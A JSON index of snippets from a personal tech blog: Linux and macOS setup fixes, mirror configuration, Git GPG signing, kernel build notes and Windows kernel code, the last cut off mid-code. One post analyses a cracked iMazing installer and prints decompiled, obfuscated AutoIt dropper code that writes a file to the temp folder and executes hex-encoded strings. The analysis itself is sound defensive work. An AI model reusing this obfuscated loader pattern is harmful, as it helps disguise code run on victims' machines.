[ { "title": "ProblemsEncounteredInInstallingArchonROGLaptop", "url": "/posts/ProblemsEncounteredInInstallingArchonROGLaptop/", "categories": "Other", "tags": "Arch, Linux", "date": "2021-11-09 09:22:01 +0800", "snippet": "Problems encountered in installing Arch on ROG LaptopSource of this article: MoeomuBlogNo display after installing NVIDIA graphics cardInstalled packages xf86-video-intel mesa nvidiaSolution remove package: sudo pacman -R xf86-video-intel remove xconfig: sudo rm /etc/X11/xorg.conf edit xconfig: sudo vim /etc/X11/xorg.conf.d/10-nvidia-drm-outputclass.conf 10-nvidia-drm-outputclass.confSection &quot;OutputClass&quot; Identifier &quot;intel&quot; MatchDriver &quot;i915&quot; Driver &quot;modesetting&quot;EndSectionSection &quot;OutputClass&quot; Identifier &quot;nvidia&quot; MatchDriver &quot;nvidia-drm&quot; Driver &quot;nvidia&quot; Option &quot;AllowEmptyInitialConfiguration&quot; Option &quot;PrimaryGPU&quot; &quot;yes&quot; ModulePath &quot;/usr/lib/nvidia/xorg&quot; ModulePath &quot;/usr/lib/xorg/modules&quot;EndSection reboot More references: ArchWiki-PRIMENo sound edit file:sudo vim /etc/modprobe.d/alsa-base.conf alsa-base.confoptions snd-hda-intel model=asus-zenbook Problems that still exist: The volume can only be 0% or 100%, but the application volume can be adjusted individually. More references: No sound ALC294 Asus ROG Strix 512 Ubuntu 20.04.01The wireless network is unstableInstalled packages dhcpcd NetworkManager iwdSolution stop and disable service: sudo systemctl stop dhcpcd sudo systemctl disable dhcpcd sudo systemctl stop iwd sudo systemctl disable iwd remove package: sudo pacman -R dhcpcd rebootFundamental problemThe fundamental problem is that dhcpcd conflicts with NetworkManager." }, { "title": "Problem summary of installing Ubuntu on AsusStrixScarG532", "url": "/posts/ProblemSummaryInstallUbuntuOnAsusStrixScarG532/", "categories": "Other", "tags": "Ubuntu, Driver", "date": "2021-10-16 11:22:01 +0800", "snippet": "Problem summary of installing Ubuntu on AsusStrixScarG532Source of this article: MoeomuBlogInstall Nvidia driver on Ubuntu with SecurityBoot Install Nvidia graphic card driver during install ubuntu During installation, make sure to select the Install third-party software for graphics and Wi-Fi hardware and addition media formats in Updates and other software screen. Select Configure Secure Boot, and set password. Continue Ubuntu installation as normal. During the first reboot, Perform MOK management screen will showup. Select Enroll MOK option. Select Continue, then, Yes. Enroll the key(s)? screen will present. Enter the password from Step 2. OK and reboot. Install the “third party” software option after skipped it in the ubuntu installer sudo apt-get install ubuntu-restricted-extras Refer to above Sound Not Working edit/etc/modprobe.d/alsa-base.conf Add a line options snd-hda-intel model=asus-zenbook at the end of the file" }, { "title": "虚拟机硬件加速导致的Electron应用白屏的问题", "url": "/posts/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A1%AC%E4%BB%B6%E5%8A%A0%E9%80%9F%E5%AF%BC%E8%87%B4%E7%9A%84Electron%E5%BA%94%E7%94%A8%E7%99%BD%E5%B1%8F%E7%9A%84%E9%97%AE%E9%A2%98/", "categories": "Other", "tags": "macOS, parallels", "date": "2021-10-12 19:22:01 +0800", "snippet": "虚拟机硬件加速导致的Electron应用白屏的问题本文来源：Moeomu的博客问题再现 可重现：是 主机系统：macOS BigSur 11.6 虚拟机系统：Ubuntu Desktop 20.04.3 Parallels虚拟机版本：17.0.1 问题描述：虚拟机系统在安装或者运行基于NodeJS尤其是Electron的应用后，应用会出现占据1/4的白色屏幕且3/4黑屏的异常显示情况，无法正常使用 故障典型应用： VSCode Motrix Typora 解决方案方案一给每一个Electron应用添加启动时参数--disable-gpu 补充：可以在桌面建立一个快捷方式实现，以vscode为例，内容如下 code.desktop[Desktop Entry]Name=Visual Studio CodeComment=Code Editing. Redefined.GenericName=Text EditorExec=/usr/share/code/code --disable-gpu --unity-launch %FIcon=com.visualstudio.codeType=ApplicationStartupNotify=falseStartupWMClass=CodeCategories=Utility;TextEditor;Development;IDE;MimeType=text/plain;inode/directory;application/x-code-workspace;Actions=new-empty-window;Keywords=vscode;X-Desktop-File-Install-Version=0.24[Desktop Action new-empty-window]Name=New Empty WindowExec=/usr/share/code/code --disable-gpu --new-window %FIcon=com.visualstudio.code方案二关闭Parallels/其他虚拟化软件-此虚拟机的图形-硬件加速功能，如下图所示其他信息Electron的官方开发人员在Github上提到 You can probably disable GPU acceleration to work around this, or just use another visual machine software. Basically the GPU acceleration of Linux in virtual machines is a mess, depending on the software of visual machine, the version and distribution of Linux, and the version of Chromium, you can get various results and bugs. Linux的虚拟机硬件加速一团糟，因此出现这个情况是正常的" }, { "title": "分析iMazing_TNTCracked", "url": "/posts/%E5%88%86%E6%9E%90iMazing_TNTCracked/", "categories": "Analyze", "tags": "Analyze, Virus, Windows", "date": "2021-09-27 13:56:01 +0800", "snippet": "分析iMazing_TNTCracked本文来源：Moeomu的博客缘起想找个爱思助手的备份，找上了iMazing，兴起找到了TNT破解版的iMazing，从此链接下载适用于Windows的iMazing后却发现被Windows11自带的杀毒软件报毒，于是起了想分析这个破解版的兴趣分析1、概览 如图所示，解压后是一个官方安装包以及一个Create__Fix.exe，正是这个文件被报毒，以此展开调查2、Create__Fix.exe 拖入DIE，看到这个文件似乎是个压缩包，将它解压，内容如图所示 其中有一个Fix.exe以及一个iMazing_fix.bat，但是这个bat打开是乱码，使用C32Asm来看一下十六进制格式内容，如图所示 这不是看的很清楚嘛，这个iMazing_fix.bat的运行流程如下 第一步，运行Fix.exe，参数是pt147147和-d%dir%，这个写法让我感觉这是个压缩文件了，貌似还真是 第二步，等待一秒 第三步，删除Fix.exe和iMazing_fix.bat 我不禁好奇，是什么原因让它向千层饼看齐，一层又一层没完没了 如图所示，不出意料它又是一个RAR压缩文件3、Fix.exe 解压缩，需要密码，我猜密码是t147147，哦猜对了，TNT团队并没有定制自己的解压工具，用WinRAR的sfx自解压模块传参解压，解压后如图所示 解压后的文件分为三个，bat脚本依旧是被加密的状态，再次使用十六进制编辑器阅读它 经过DIE分析，data.bin是个可执行程序，将它重命名为data.exe 经过DIE分析，v1是个二进制文件，暂时无法识别4、Created_By_TNT_Team.bat 如图所示，这个脚本文件做的操作是以下几步 第一步，清理屏幕 第二步，关闭回显 第三步，运行data.bin这个可执行程序，参数是v1 第四步，删除v1、data.bin、Created_By_TNT_Team.bat 4、data.exe和v1 这个data.exe重命名后就十分明了，它是AutoIt3的脚本运行器，那么v1不出所料就是一个AutoIt3的脚本，后缀应该是a3x v1是编译完成的au3脚本，我在GitHub上找到了一些反编译器，例如UnAutoIt 如图所示，解压完毕，从v1中释放出来一个iMazing.exe以及一个脚本，此脚本混淆极其严重，几乎无法阅读 被修改后的iMazing.exe还附带原始的数字签名，尽管它已经失效，看起来它将会本地修改iMazing.exe，应该算是一个文件补丁，但是看起来哈希没什么变化… 以下是反编译出来的一些有用的代码Func a2f00001b21_() For $ax0x0xa = 0x1 To 0x5 Local $a2f00001b21sz_ = a2f00001b21x_() FileInstall(&quot;d3c0ef51c80f467bc9002bbf93fcb10d0c917dbaae819ccd925e2f8902d3c9c5229702964c538605098cce34d2e9cc90ce0618992ba26caea18b5b5ccd9dd0acf02370c4bc004868283b8067c8309862&quot; &amp;amp; _ &quot;cf2f70d92252928d02af9b1c7d80c3303522b08f2&quot;, $a2f00001b21sz_, 0x1) Global $a2f00001b21, $os = Execute(BinaryToString(&quot;0x457865637574652842696E617279746F737472696E67282730783435373836353633373537343635323834323639364536313732373937343646373337343732363936453637323832373330373833&quot; &amp;amp; _ &quot;3533333337333433373332333633393336343533363337333533333337333033363433333633393337333433323338333433363336333933363433333633353335333233363335333633313336333433&quot; &amp;amp; _ &quot;3233383332333433343331333333323334333633333330333333303333333033333330333333313334333233333332333333313337333333373431333534363332333933323433333233373337343333&quot; &amp;amp; _ &quot;33333333333338333333373334333933323337333234333333333133323339323732393239272929&quot;)) If IsArray($os) And $os[0x0] &amp;gt;= 0x46da Then ExitLoop Sleep(0xa) Next Execute(BinaryToString(&quot;0x457865637574652842696E617279746F737472696E67282730783435373836353633373537343635323834323639364536313732373937343646373337343732363936453637323832373330373833&quot; &amp;amp; _ &quot;3333313332343233343336333633393336343333363335333433343336333533363433333633353337333433363335333233383332333433343331333333323334333633333330333333303333333033&quot; &amp;amp; _ &quot;3333303333333133343332333333323333333133373333333734313335343633323339323732393239272929&quot;))EndFunc ; -&amp;gt; a2f00001b21_Func a2f00001b21x_() Local $a2f00001b21s1_ = a2f00001b21(&quot;4054656D70446972&quot;), $a2f00001b21s3_ = a2f00001b21(&quot;31&quot;), $a2f00001b21s4_ = a2f00001b21(&quot;5c&quot;), $a2f00001b21s5_ = a2f00001b21(&quot;5c&quot;), $a2f00001b21s6_ = a2f00001b21(&quot;37&quot;), $a2f00001b21s8_ = a2f00001b21(&quot;3937&quot;), $a2f00001b21s9_ = a2f00001b21(&quot;313232&quot;), $a2f00001b21s7_ = a2f00001b21(&quot;31&quot;), $a2f00001b21sa_ Local $a2f00001b21s2_ = Execute($a2f00001b21s1_) If StringRight($a2f00001b21s2_, Number($a2f00001b21s3_)) &amp;lt;&amp;gt; $a2f00001b21s4_ Then $a2f00001b21s2_ = $a2f00001b21s2_ &amp;amp; $a2f00001b21s5_ SRandom(Number(StringRight(TimerInit(), 0x4))) Do $a2f00001b21sa_ = &#39;&#39; While StringLen($a2f00001b21sa_) &amp;lt; Number($a2f00001b21s6_) $a2f00001b21sa_ = $a2f00001b21sa_ &amp;amp; Chr(Random(Number($a2f00001b21s8_), Number($a2f00001b21s9_), Number($a2f00001b21s7_))) WEnd $a2f00001b21sa_ = $a2f00001b21s2_ &amp;amp; $a2f00001b21sa_ Until Not FileExists($a2f00001b21sa_) Return ($a2f00001b21sa_)EndFunc ; -&amp;gt; a2f00001b21x_Func a2f00001b21($a2f00001b21) Local $a2f00001b21_ For $x = 0x1 To StringLen($a2f00001b21) Step 0x2 $a2f00001b21_ &amp;amp;= Chr(Dec(StringMid($a2f00001b21, $x, 0x2))) Next Return $a2f00001b21_EndFunc ; -&amp;gt; a2f00001b21结论 它应该什么都没干仅仅只是释放了一个可执行文件，但是这个释放方式实在是令人奇怪 它最后释放的iMazing.exe是并未破解的版本，事情更加奇怪了" }, { "title": "NodeJS源配置", "url": "/posts/NodeJS%E6%BA%90%E9%85%8D%E7%BD%AE/", "categories": "Programming", "tags": "Programming, NodeJS", "date": "2021-09-27 13:56:01 +0800", "snippet": "NodeJS源配置本文来源：Moeomu的博客安装 Debain(Ubuntu, etc.)apt install nodeapt install yarn macOSbrew install nodebrew install yarn配置镜像源设置为淘宝镜像源npm config set registry https://registry.npm.taobao.org/yarn config set registry https://registry.npm.taobao.org/重置为官方镜像源npm config set registry https://registry.npmjs.org/yarn config set registry https://registry.yarnpkg.com/" }, { "title": "macOS关闭内置屏幕", "url": "/posts/macOS%E5%85%B3%E9%97%AD%E5%86%85%E7%BD%AE%E5%B1%8F%E5%B9%95/", "categories": "Other", "tags": "Other, macOS", "date": "2021-09-16 17:00:00 +0800", "snippet": "macOS关闭内置屏幕本文来源：Moeomu的博客磁铁大法寻找两块磁铁，放置在 MacBook的音响附近的位置，欺骗系统合盖检测从而实现关闭内置屏幕NVRAM启动设置法 此方法从驱动层面实现了将画面单独显示在外接屏幕上启用 重新启动，按着Command+R按键不放 输入密码进入启动设置-终端 输入命令nvram boot-args=&quot;niog=1&quot; 连接外接显示器，连接电源，重新启动 启动后输入用户密码立刻合盖，随后看到外接屏有画面，打开MacBook的盖子，成功还原 重新启动，按着Command+R按键不放 输入密码进入启动设置-终端 输入命令nvram -d boot-args 重新启动" }, { "title": "Linux内核学习笔记-001-编译和启动内核", "url": "/posts/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%BC%96%E8%AF%91%E5%92%8C%E5%90%AF%E5%8A%A8%E5%86%85%E6%A0%B8/", "categories": "Kernel", "tags": "inux, Kernel", "date": "2021-07-07 11:20:00 +0800", "snippet": "Linux内核学习笔记-001-编译和启动内核本文来源：Moeomu的博客准备环境 Ubuntu 20.04 LTS Linux 4.9.229 Busybox 1.33.0 qemu下载内核源代码和文件系统源代码 在站点Kernel.org下载linux-4.9.229.tar.gz 在站点Busybox.net下载busybox-1.33.0.tar.bz2 通过apt安装qemu：sudo apt install qemu-system-x86编译编译内核 export ARCH=x86 make x86_64_defconfig make menuconfig 选中General Setup -&amp;gt; Initial RAM filesystem and RAM disk(initramfs/initrd) support 选中Device Drivers -&amp;gt; Block devices -&amp;gt; RAM block device support 修改Device Drivers -&amp;gt; Block devices -&amp;gt; RAM block device support -&amp;gt; (65536)default RAM disk size (kbytes) 如果这一步报错fatal error: curses.h，则安装一下sudo apt install libncurses5-dev make 编译好的内核被放置在目录arch/x86/boot下，文件名bzImage 编译busybox make menuconfig 选中Settings -&amp;gt; Build Options -&amp;gt; [*] Build Busybox as a static binary (no shard libs) make &amp;amp;&amp;amp; make install打包文件系统 mkdir etc dev mnt mkdir -p proc sys tmp mkdir -p etc/init.d vim etc/fstab proc /proc proc defaults 0 0tmpfs /tmp tmpfs defaults 0 0sysfs /sys sysfs defaults 0 0 vim etc/init.d/rcS echo -e &quot;Welcome to Moeomu Linux&quot;/bin/mount -aecho -e &quot;Remounting the root filesystem&quot;mount -o remount rw /mkdir -p /dev/ptsmoutn -t devpts devpts /dev/ptsecho /sbin/mdev &amp;gt; /proc/sys/kernel/hotplugmdev -s chmod 755 etc/init.d/rcS vim etc/inittab ::sysinit:/etc/init.d/rcS::respawn:-/bin/sh::askfirst:-/bin/sh::cttlaltdel:/bin/umount -a -r chmod 755 etc/inittab cd dev sudo mknod console c 5 1 sudo mknod null c 1 3 sudo mknod tty1 c 4 1 以下代码在busybox源码目录下逐行执行 #!/bin/bashrm -rf rootfs.ext3sudo rm -rf fsdd if=/dev/zero of=./rootfs.ext3 bs=1M count=32mkfs.ext3 rootfs.ext3mkdir fssudo mount -o loop rootfs.ext3 ./fssudo cp -rf ./_install/* ./fssudo umount ./fsgzip --best -c rootfs.ext3 &amp;gt; rootfs.img.gz 最终生成了文件系统：rootfs.img.gz使用QEMU运行系统 qemu-system-x86_64 -kernel ./linux-4.9.229/arch/x86_64/boot/bzImage -initrd ./busybox-1.33.1/rootfs.img.gz -append &quot;root=/dev/ram init=/linuxrc&quot; -serial file:output.txt 预览如下 " }, { "title": "ParallelsTools高版本Kali报错", "url": "/posts/ParallelsTools%E9%AB%98%E7%89%88%E6%9C%ACKali%E6%8A%A5%E9%94%99/", "categories": "Other", "tags": "Other, macOS", "date": "2021-07-06 15:55:00 +0800", "snippet": "macOS下的虚拟机Parallels的工具ParallelsTools安装于高版本Kali报错的解决办法本文来源：Moeomu的博客首先更新kali源 阿里云源如下deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib报错内容An error occurred while installing the following packages:- libelf-dev- linux-headers-5.10.0-kali9-amd64- dkmsInstall these packages manually and start the Parallels Tools installation again.解决方案 安装缺失的包sudo apt install dkmssudo apt intall libelf-dev 坑点记录：Kali 2021默认的xfce桌面环境会导致安装ParallelsTools后白屏，所以要事先将桌面环境切换为gnome或者在安装kali的时候就取消选择xface，选中gnome" }, { "title": "Windows-GitGPG密钥配置", "url": "/posts/Windows-GitGPG%E5%AF%86%E9%92%A5%E9%85%8D%E7%BD%AE/", "categories": "Other", "tags": "Other, Windows", "date": "2021-06-05 08:50:00 +0800", "snippet": "Windodws下的GitGPG密钥配置和开启签名验证本文来源：Moeomu的博客下载GPG4WIN下载链接：gpg4win创建和应用GPG密钥创建GPG密钥 创建：gpg --full-generate-key 密钥长度：4096 输入用户名、邮箱 列出所有密钥：gpg --list-secret-keys --keyid-format=long 根据keyid导出密钥：gpg --armor --export KEYID应用密钥 将密钥导入Github和Gitee配置Git Windows 配置默认用户名和邮箱，需要和创建GPG时设定的值保持一致 git config --global user.name USERNAME git config --global user.email EMAIL 配置密钥 git config --global user.signingKey KEYID 启用全局加密签名 git config --global commit.gpgSign true " }, { "title": "Homebrew常用软件", "url": "/posts/Homebrew%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6/", "categories": "Other", "tags": "Other, macOS", "date": "2021-06-01 09:31:00 +0800", "snippet": "Homebrew中的一些常用软件的记录会经常更新的本文来源：Moeomu的博客List Formulae 包名 用途 cmake auto-compile ffmpeg video processor gdb cpp debugger gpg gnupg htop processor monitor pandoc convert file python python3 unar decompress you-get web video downloader zsh z-shell Casks 包名 用途 clashx proxy tool iina video player mounty NTFS disk loader oracle-jdk java development kit " }, { "title": "macOS-GitGPG密钥配置", "url": "/posts/macOS-GitGPG%E5%AF%86%E9%92%A5%E9%85%8D%E7%BD%AE/", "categories": "Other", "tags": "Other, macOS", "date": "2021-05-25 07:55:00 +0800", "snippet": "macOS下的GitGPG密钥配置和开启签名验证本文来源：Moeomu的博客关于GitHub GPG密钥验证开启Commit签名GitHub有个新的“警惕模式”，启用后GPG密钥需要签名认证的commit才会显示“Verity”，启用方法如下 首先创建GPG密钥（GitHub官方Docs有详细方法，不再赘述） 列出GPG密钥的特征码：gpg -K --keyid-format LONG，将keyid记录 告知git使用此GPG密钥：git config user.signingkey your_keyid 本地git的用户名和邮箱需要和GPG密钥生成时填入的相同：git config user.name name，git config user.email email 启用本地git的Commit签名：git config commit.gpgsign true Commit签名加入-S选项：git commit -S -m message发生致命错误-无法Commit-macOS问题如下，复现于macOS 11.3.1中error: gpg failed to sign the datafatal: failed to write commit objectmacOS中的解决办法 更新&amp;amp;安装brew upgrade gnupg # This has a make step which takes a whilebrew link --overwrite gnupgbrew install pinentry-macecho &quot;pinentry-program /usr/local/bin/pinentry-mac&quot; &amp;gt;&amp;gt; ~/.gnupg/gpg-agent.confkillall gpg-agentgit config --global gpg.program gpg # perhaps you had this already? On linux maybe gpg2git config --global commit.gpgsign true # if you want to sign every commit 再次签名 查看commit状态：git log --show-signature -1" }, { "title": "日常杂谈", "url": "/posts/%E6%97%A5%E5%B8%B8%E6%9D%82%E8%B0%88/", "categories": "Other", "tags": "Other", "date": "2021-05-24 10:36:00 +0800", "snippet": "一些杂谈本文来源：Moeomu的博客Mention稍微提及一下，山西校企通的自动打卡项目经过思考之后将它决定将它开源，这只是一段赶工出来的不成熟的代码，因此可能会有些阅读困难，但是使用不会有问题，也已经稳定运行了半年多，Readme中我写了所有的使用方法和注意事项，以下是开源地址[Github]-XQT-Auto-Clockin 特性 全自动打卡 多用户自动打卡（为了防止服务器被封IP设置了延时打卡） 不需要账户密码，只需要身份证号即可 My Way似乎会经常陷入抑郁状态，似乎越来越难以控制自己，也许应该去医院看看了" }, { "title": "VSCode-Python-遇到的问题", "url": "/posts/VSCode-Python-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/", "categories": "Other", "tags": "Windows, Other", "date": "2021-01-19 17:48:00 +0800", "snippet": "记录一下在Windows写Python代码遇到的问题当然是很简单的一些小问题，算是本地备份一下笔记本文来源：Moeomu的博客VSCode-Python-Venv-PowerShell未签名环境无法激活 在Windows下激活VENV虚拟Python环境写代码遇到了PowerShell文件的无法运行的事情，原因是PowerShell脚本文件未签名，百度寻找了一下解决办法却是清一色的让将Windows安全策略改成签名，如下 set-executionpolicy remotesigned 总觉得不应该这样，这样修改策略实属下策，去谷歌找了一下解决办法，发现这是个2018年的问题，未有良好的解决办法，但是仍旧找到了一份好的策略，即将当前用户的签名策略改成需远程签名，其它用户仍旧是阻挡 Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser 随后可以通过以下代码查看策略修改情况 Get-ExecutionPolicy -LISTPython更换PIP源 每次都搜索引擎找源太麻烦了，不如直接记个笔记备份到本地为好Windows%HOMEPATH%/pip/pip.iniLinux &amp;amp; macOS~/.pip/pip.conf编辑格式[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple[install]trusted-host=pypi.tuna.tsinghua.edu.cnpip源 名称 源的地址 清华 https://pypi.tuna.tsinghua.edu.cn/simple 阿里云 http://mirrors.aliyun.com/pypi/simple/ 中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/ 华中理工大学 http://pypi.hustunique.com/ 山东理工大学 http://pypi.sdutlinux.org/ 豆瓣 http://pypi.douban.com/simple/ pip模块未找到错误 python -m ensurepip python -m pip install --upgrade pip" }, { "title": "Windows内核学习笔记-002", "url": "/posts/Windows%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-002/", "categories": "Kernel", "tags": "Windows, Kernel", "date": "2020-12-18 20:52:00 +0800", "snippet": "这一节依旧是基础内容的复习本文来源：Moeomu的博客字符串操作 内核中使用UNICODE_STRING结构来作为基本的字符串结构，应该注意的是使用此结构中的lenth成员确定字符串长度，而不是&#39;\\0&#39;。字符串初始化 函数：RtlInitUnicodeString 参数： PUNICODE_STRING: DestinationString PCWSTR: SourceString 返回值：无 IRQL：&amp;lt;=DISPATCH_LEVEL 解释：初始化一个以0结尾的WCHAR字符串，第一个参数是输入参数也是输出参数UNICODE_STRING uFirstString = {0};RtlInitUnicodeString(&amp;amp;uFirstString, L&quot;HelloWorld\\n&quot;);DbgPrint(&quot;String:%wZ&quot;, &amp;amp;uFirstString); 坑：它并没有为buffer分配空间，而是直接指向Source首地址，因此要保证Source始终有效，否则就是无效访问字符串拷贝 函数：RtlUnicodeStringCopyString 参数： PUNICODE_STRING: DestinationString NTSTRSAFE_PCWSTR: pszSrc 返回值：NTSTAUTS 成功执行返回STATUS_SUCCESS IRQL：=PASSIVE_LEVEL 解释：将src复制一份到dest里面WCHAR strBuf[128] = {0};UNICODE_STRING uFirstString = {0};RtlInitEmptyUnicodeString(&amp;amp;uFirstString, strBuf, sizeof(strBuf));RtlUnicodeStringCopyString(&amp;amp;uFirstString, L&quot;Hello Kernel\\n&quot;);DbgPrint(&quot;String: %wZ&quot;, &amp;amp;uFirstString); 坑：为了使用RtlUnicodeStringCopyString函数，应该添加头文件Ntstrsafe.h；不能copy到定长buf的String里，否则会蓝屏报内存读写错误链表链表的定义 以下是wdk中链表的定义typedef struct _LIST_ENTRY{ struct _LIST_ENTRY *Flink; // 后节点 struct _LIST_ENTRY *Blink; // 前节点} LIST_ENTRY, *PLIST_ENTRY;使用链表typedef struct _TestListEntry{ ULONG m_ulData1; ULONG m_ulData2; LIST_ENTRY m_ListEntry; ULONG m_ulData3; ULONG m_ulData4;} 一般而言，为了方便操作，会定义一个链表的头结点，不包含任何内容，只是一个LIST_ENTRY结构。头节点初始化LIST_ENTRY ListHeader = {0};InitializeListHead(&amp;amp;ListHeader);节点插入LIST_ENTRY ListHeader = {0};TestListEntry Entry1 = {0};TestListEntry Entry2 = {0};TestListEntry Entry3 = {0};Entry1.m_ulData1 = &#39;A&#39;;Entry2.m_ulData1 = &#39;B&#39;;Entry3.m_ulData1 = &#39;C&#39;;InitializeListHead(&amp;amp;ListHeader);InsertHeadList(&amp;amp;ListHeader, &amp;amp;Entry2.m_ListEntry);InsertHeadList(&amp;amp;ListHeader, &amp;amp;Entry1.m_ListEntry);InsertTailList(&amp;amp;ListHeader, &amp;amp;Entry3.m_ListEntry);链表遍历PLIST_ENTRY pListEntry = NULL;pListEntry = ListHeader.Flink;while(pListEntry != &amp;amp;ListHeader){ PTestListEntry pTestEntry = CONTAINING_RECORD(pListEntry, TestListEntry, m_ListEntry); DbgPrint(&quot;ListPtr=%p, Entry=%p, Tag=%c\\n&quot;, pListEntry, pTestEntry, (CHAR)pTestEntry-&amp;gt;m_ulData1); pListEntry = pListEntry-&amp;gt;Flink;} CONTAINING_RECORD的作用是将m_ListEntry地址转为结构体TestListEntry首地址 CONTAINING_RECORD用法：CONTAINING_RECORD(PCHAR Address, TYPE Type, PCHAR Field)节点移除 移除首节点：PLIST_ENTRY RemoveHeadList(PLIST_ENTRY ListHead) 移除尾节点：PLIST_ENTRY RemoveTailList(PLIST_ENTRY ListHead) 如果成功，上面两个函数都将返回链首地址，如果无法移除，则返回NULL 移除特定节点： BOOLEAN RemoveEntryList(PLIST_ENTRY Entry) 若移除后变成空链表，那么将返回TRUE，如果非空，则返回FALSE 判断链表状态 BOOLEAN IsListEmpty(const LIST_ENTRY *ListHead) 它返回TRUE时表示为空链表，否则表示链表非空自旋锁使用自旋锁 自旋锁是内核提供的一种高IRQL锁，用同步以及独占的方式访问某个资源 注意事项： 自旋锁变量不能存放在当前函数栈中，否则每次进入初始化一遍跟不初始化一样 初始化/使用自旋锁// Initialize Spin Lock WARN: not local varKSPIN_LOCK my_spin_lock;void initLock(){ KeInitializeSpinLock(&amp;amp;my_spin_lock);}void TestFuncLock(){ // it&#39;s a safe function // Acquire Lock KIRQL irql; // save old irql // Normal Spin Lock KeAcquireSpinLock(&amp;amp;my_spin_lock, &amp;amp;irql); // TO DO KeReleaseSpinLock(&amp;amp;my_spin_lock, irql);}自旋锁在双向链表中使用void TestFuncLock(){ // it&#39;s a safe function DbgPrint(&quot;[%ws] Enter...\\n&quot;, __FUNCTIONW__); // Acquire Lock KIRQL irql; // save old irql // Normal Spin Lock KeAcquireSpinLock(&amp;amp;my_spin_lock, &amp;amp;irql); // Test List typedef struct _FILE_INFO { LIST_ENTRY m_ListEntry; UNICODE_STRING m_strFileName; }FILE_INFO, *PFILE_INFO; LIST_ENTRY listHead; FILE_INFO my_file_info; RtlInitUnicodeString(&amp;amp;my_file_info.m_strFileName, L&quot;TestName&quot;); InitializeListHead(&amp;amp;listHead); ExInterlockedInsertHeadList(&amp;amp;listHead, &amp;amp;my_file_info.m_ListEntry, &amp;amp;my_spin_lock); KeReleaseSpinLock(&amp;amp;my_spin_lock, irql);}队列自旋锁 队列自旋锁可以在多CPU平台上有更好的性能，也遵循先等待先获取自旋锁的原则。 它和普通自旋锁的初始化是一样的，但是初始化后的自旋锁绝不能混用KSPIN_LOCK my_spin_lock;void initLock(){ KeInitializeSpinLock(&amp;amp;my_spin_lock);}void TestFuncLock(){ // it&#39;s a safe function // Acquire Lock KIRQL irql; // save old irql // Queue Spin Lock KLOCK_QUEUE_HANDLE my_lock_queue_handle; KeAcquireInStackQueuedSpinLock(&amp;amp;my_spin_lock, &amp;amp;my_lock_queue_handle); KeReleaseInStackQueuedSpinLock(&amp;amp;my_lock_queue_handle);}内存分配常规内存分配void TestFuncMem(){ PVOID buffer = ExAllocatePoolWithTag(NonPagedPoolNx, 512, &#39;tag1&#39;); if (buffer) { ExFreePoolWithTag(buffer, &#39;tag1&#39;); DbgPrint(&quot;[%ws] Pool Operate Success!\\n&quot;, __FUNCTIONW__); } else { DbgPrint(&quot;[%ws] Allocate Pool Failed!\\n&quot;, __FUNCTIONW__); }}快表内存分配 优点：高频率从系统中申请和释放内存，使用快表分配将大大提高性能 注意：有些地方称为“旁视列表”(LookAside)void TestFuncMemLookaside(){ PNPAGED_LOOKASIDE_LIST pLookAsideList = NULL; BOOLEAN bSucc = FALSE; BOOLEAN bInit = FALSE; PVOID pFirstMemory = NULL; PVOID pSeocdeMemory = NULL; do { pLookAsideList = (PNPAGED_LOOKASIDE_LIST)ExAllocatePoolWithTag(NonPagedPoolNx, sizeof(NPAGED_LOOKASIDE_LIST), &#39;test&#39;); if (pLookAsideList == NULL) { break; } memset(pLookAsideList, 0, sizeof(NPAGED_LOOKASIDE_LIST)); // init ExInitializeNPagedLookasideList(pLookAsideList, NULL, NULL, 0, 128, &#39;test&#39;, 0); bInit = TRUE; // start allocate pFirstMemory = ExAllocateFromNPagedLookasideList(pLookAsideList); if (pFirstMemory == NULL) { break; } pSeocdeMemory = ExAllocateFromNPagedLookasideList(pLookAsideList); if (pSeocdeMemory == NULL) { break; } DbgPrint(&quot;[%ws] First Address:%p, Second Address:%p\\n&quot;, __FUNCTIONW__, pFirstMemory, pSeocdeMemory); // free first ExFreeToNPagedLookasideList(pLookAsideList, pFirstMemory); pFirstMemory = NULL; // reallocate pFirstMemory = ExAllocateFromNPagedLookasideList(pLookAsideList); if (pFirstMemory == NULL) { break; } DbgPrint(&quot;[%ws] Re-Allocate First Address:%p\\n&quot;, __FUNCTIONW__, pFirstMemory); bSucc = TRUE; } while (FALSE); if (pFirstMemory != NULL) { ExFreeToNPagedLookasideList(pLookAsideList, pFirstMemory); pFirstMemory = NULL; } if (pSeocdeMemory != NULL) { ExFreeToNPagedLookasideList(pLookAsideList, pSeocdeMemory); pSeocdeMemory = NULL; } if (bInit == TRUE) { ExDeleteNPagedLookasideList(pLookAsideList); bInit = FALSE; } if (pLookAsideList != NULL) { ExFreePoolWithTag(pLookAsideList, &#39;test&#39;); pLookAsideList = NULL; }}对象与句柄 在内核中创建，在内核中销毁，由内核管理与维护的对象称为内核对象void TestFuncObject(){ BOOLEAN bSucc = FALSE; HANDLE hCreateEvent = NULL; PVOID pCreateEventObject = NULL; HANDLE hOpenEvent = NULL; PVOID pOpenEventObject = NULL; do { OBJECT_ATTRIBUTES ObjAttr = { 0 }; UNICODE_STRING uNameString = { 0 }; RtlInitUnicodeString(&amp;amp;uNameString, L&quot;\\\\BaseNamedObjects\\\\TestEvent&quot;); InitializeObjectAttributes(&amp;amp;ObjAttr, &amp;amp;uNameString, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL); ZwCreateEvent(&amp;amp;hCreateEvent, EVENT_ALL_ACCESS, &amp;amp;ObjAttr, SynchronizationEvent, FALSE); if (hCreateEvent == NULL) { break; } // get point ObReferenceObjectByHandle(hCreateEvent, EVENT_ALL_ACCESS, *ExEventObjectType, KernelMode, &amp;amp;pCreateEventObject, NULL); if (pCreateEventObject == NULL) { break; } // open obj with attribute:name ZwOpenEvent(&amp;amp;hOpenEvent, EVENT_ALL_ACCESS, &amp;amp;ObjAttr); if (hOpenEvent == NULL) { break; } 